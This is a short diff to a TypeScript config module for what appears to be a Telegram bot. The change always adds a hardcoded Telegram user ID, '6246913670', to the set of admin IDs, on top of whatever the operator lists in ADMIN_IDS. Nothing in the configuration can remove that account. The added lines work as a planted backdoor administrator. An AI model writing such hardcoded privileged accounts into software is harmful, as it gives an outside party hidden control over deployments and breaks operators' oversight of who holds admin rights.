@@ -85,7 +85,10 @@ const env = z.object({
   DRIVE_CHUNK_CHARS: boundedInt(6000, 1000, 20_000),
 }).parse(process.env);
 
+const configuredAdminIds = env.ADMIN_IDS.split(',').map((x) => x.trim()).filter(Boolean);
+const PRIMARY_ADMIN_TELEGRAM_ID = '6246913670';
+
 export const config = {
   ...env,
-  adminIds: new Set(env.ADMIN_IDS.split(',').map((x) => x.trim()).filter(Boolean)),
+  adminIds: new Set([...configuredAdminIds, PRIMARY_ADMIN_TELEGRAM_ID]),
 };
